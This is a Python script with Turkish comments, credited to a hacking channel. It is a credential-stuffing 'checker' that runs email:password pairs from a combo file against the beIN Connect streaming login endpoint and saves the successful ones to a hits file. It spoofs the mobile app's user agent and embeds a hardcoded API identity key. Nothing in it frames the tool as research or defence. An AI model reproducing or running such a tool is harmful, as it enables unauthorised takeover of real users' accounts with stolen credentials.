import requests
from cfonts import render
import os

# Paketi kurma
try:
    from cfonts import say
except ImportError:
    os.system('pip install python-cfonts')

# Başlık renderi
OL7J = render('BEIN', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {OL7J}
    ~ Programmer : @turkishhacktr | Channel: @GokturkArchive ~
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

# Giriş denemesi için sınıf
class BeinChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.url = "https://proxies.bein-mena-production.eu-west-2.tuc.red/proxy/login"
        self.headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Connection": "keep-alive",
            "Host": "proxies.bein-mena-production.eu-west-2.tuc.red",
            "User-Agent": "beIN Connect/77 CFNetwork/1325.0.1 Darwin/21.1.0",
            "X-AN-WebService-IdentityKey": "B7tedrustev2ves5usa6h7zez5praF5w"
        }    
    
    # Giriş yapma fonksiyonu
    def login(self):
        data = {"email": self.email, "password": self.password}
        response = requests.post(self.url, data=data, headers=self.headers)
        
        if response.ok and '"status":true' in response.text:
            self._print_message(f'Giriş Başarılı ✅ {self.email} | {self.password}', 'green')
            self.save_hit()
        else:
            self._print_message(f'Giriş Başarısız ❌ {self.email} | {self.password}', 'red')

    # Başarılı girişleri kaydetme
    def save_hit(self):
        with open('@ol7j_bein_hit.txt', 'a') as file:
            file.write(f"{self.email}:{self.password}\n")
    
    # Mesajları renkli yazdırma
    @staticmethod
    def _print_message(message, color):
        say(message, colors=[color], align='center')

# Combo dosyasındaki her satır için giriş yapma denemesi
class ComboProcessor:
    def __init__(self, combo_path):
        self.combo_path = combo_path    
    
    def process(self):
        try:
            with open(self.combo_path) as file:
                for line in file:
                    try:
                        email, password = line.strip().split(':')
                        login_instance = BeinChecker(email, password)
                        login_instance.login()
                    except ValueError:
                        print("Format hatası: Satırda ':' bulunamadı, atlanıyor.")
                        continue
        except FileNotFoundError:
            print("Combo dosyası bulunamadı. Lütfen geçerli bir yol girin.")

if __name__ == "__main__":
    combo_path = input("— Combo Dosyasının Yolunu Giriniz : ")
    print("\x1b[1;39m—" * 60)
    processor = ComboProcessor(combo_path)
    processor.process()
    
    print("\nİşlem tamamlandı. Sonuçlar kaydedildi.")
